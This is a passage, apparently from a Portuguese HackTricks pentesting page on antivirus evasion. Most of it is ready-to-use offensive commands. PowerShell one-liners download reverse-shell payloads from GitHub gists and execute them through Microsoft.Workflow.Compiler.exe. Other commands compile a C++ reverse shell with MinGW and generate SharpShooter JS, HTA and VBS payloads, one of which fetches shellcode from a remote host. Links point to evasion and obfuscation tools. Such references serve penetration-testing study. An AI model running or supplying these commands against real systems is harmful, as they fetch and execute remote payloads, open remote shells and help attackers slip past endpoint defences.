C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista de ofuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
